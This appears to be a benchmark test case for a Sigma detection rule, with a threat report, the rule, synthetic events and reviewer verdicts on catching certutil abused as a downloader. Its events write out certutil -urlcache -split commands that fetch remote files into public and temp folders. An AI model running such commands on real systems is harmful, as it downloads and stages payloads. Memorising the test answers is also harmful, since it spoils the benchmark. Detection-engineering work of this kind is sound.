id: CTL1-05
role: control
defect_class: NONE
evasive: false
why: 'Correct rule: tag T1105 is valid, -urlcache and -split are quoted in the evidence, the windash modifier
  covers the slash spelling that certutil accepts, and the ''all'' modifier requires both switches, so
  hash checks and cache deletion with certutil do not match.'
expected_gate: none
report_text: The loader retrieved its second stage with certutil.exe instead of a browser. Process creation
  events show certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe, run
  from a command shell spawned by a malicious macro. The urlcache and split switches are only used together
  when certutil is abused as a downloader. Variants of the same command used the slash form certutil.exe
  /urlcache /split /f, which certutil accepts equally. The downloaded file was renamed and executed within
  seconds. Rules should match certutil.exe with both the urlcache and split switches in either dash style.
evidence:
- certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe
- Rules should match certutil.exe with both the urlcache and split switches in either dash style.
logsource: windows_process_creation
techniques:
- T1105
sigma_yaml: |
  title: Certutil Used as Downloader via Urlcache and Split
  id: af40be52-7186-4daf-8335-60b281d35e05
  status: experimental
  description: 'Detects certutil.exe run with both the urlcache and split switches, in dash or slash spelling, which downloads a remote file.'
  references:
    - 'urn:atidep:case'
  author: case-author
  date: 2026/10/02
  tags:
    - attack.command_and_control
    - attack.t1105
  logsource:
    category: process_creation
    product: windows
  detection:
    selection_img:
      Image|endswith: '\certutil.exe'
    selection_cli:
      CommandLine|windash|contains|all:
        - '-urlcache'
        - '-split'
    condition: selection_img and selection_cli
  falsepositives:
    - 'Administrators downloading certificate revocation data by hand'
  level: high
assumptions: []
events:
  positive:
  - kind: process_create
    image: C:\Windows\System32\certutil.exe
    cmd: certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\Users\Public\svc.exe
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe /c
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\certutil.exe
    cmd: certutil.exe /urlcache /split /f http://files.cranemail.test/u.dll C:\Windows\Temp\u.dll
    parent: C:\Windows\System32\wscript.exe
    parent_cmd: wscript.exe //B C:\Users\alice\AppData\Local\Temp\inv.js
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\SysWOW64\certutil.exe
    cmd: certutil -split -urlcache -f http://198.51.100.7/a.exe C:\Users\Public\a.exe
    parent: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    parent_cmd: powershell.exe
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
  negative:
  - kind: process_create
    image: C:\Windows\System32\cmd.exe
    cmd: cmd.exe /c whoami
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\tasklist.exe
    cmd: tasklist /v
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\ipconfig.exe
    cmd: ipconfig /all
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
  lookalike:
  - kind: process_create
    image: C:\Windows\System32\certutil.exe
    cmd: certutil.exe -hashfile C:\Temp\app.msi SHA256
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\certutil.exe
    cmd: certutil.exe -urlcache * delete
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
tamper_sigma_yaml: ''
review:
  verdicts:
  - reviewer: R2
    role: primary
    verdict: present
    confidence: 90
    reasoning: YAML and pySigma parse cleanly, metadata is complete, and the tags (attack.command_and_control,
      attack.t1105) match the table for T1105. The values '\certutil.exe', '-urlcache' and '-split' occur
      in the verbatim evidence quote 'certutil.exe -urlcache -split -f http://203.0.113.45/...' (confirmed
      in report_text). The windash|contains|all chain is allowed and is the standard Sigma ordering. By
      hand, the dash-form positive, the slash-form positive (/urlcache /split) and the reordered positive
      (-split -urlcache) all match. Negatives do not match. Look-alike 'certutil.exe -hashfile ...' lacks
      the switches, and 'certutil.exe -urlcache * delete' lacks -split, so neither matches. The baseline
      has no certutil.
    events_ok: true
    incidental_issues:
    - The slash spelling appears in report_text but not in the quoted evidence. G4 strips separators,
      so the values are still covered.
    - Look-alike 2 contains a literal '*' in the command line, which is harmless.
  - reviewer: R4
    role: replacement
    verdict: present
    confidence: 88
    reasoning: The YAML parses and pySigma accepts it. pySigma expands CommandLine|windash|contains|all
      to the -, /, en-dash, em-dash and horizontal-bar forms of 'urlcache' and 'split' with an AND between
      them. All modifiers are allowed and the tags attack.command_and_control and attack.t1105 match T1105.
      Both quotations appear word for word. '-urlcache' and '-split' are in quote 1, quote 2 has 'urlcache'
      and 'split', and 'certutil.exe' is in both. By hand, positive 1 (dash form), positive 2 (slash form
      /urlcache /split) and positive 3 (reversed order -split -urlcache, SysWOW64) all match. The negatives
      (cmd whoami, tasklist, ipconfig) and the look-alikes (-hashfile, and '-urlcache * delete' with no
      split) do not. The 9-character '-urlcache' term satisfies the breadth guard, and there is no certutil
      in the baseline summary.
    events_ok: true
    incidental_issues:
    - 'Coverage gap that does not violate the case: certutil downloads without -split (certutil -urlcache
      -f URL) or via -verifyctl are not detected. The report scopes the rule to the urlcache+split pair,
      so this is not a defect here.'
    - Positive 1's parent_cmd 'cmd.exe /c' is a truncated, slightly unrealistic parent command line.
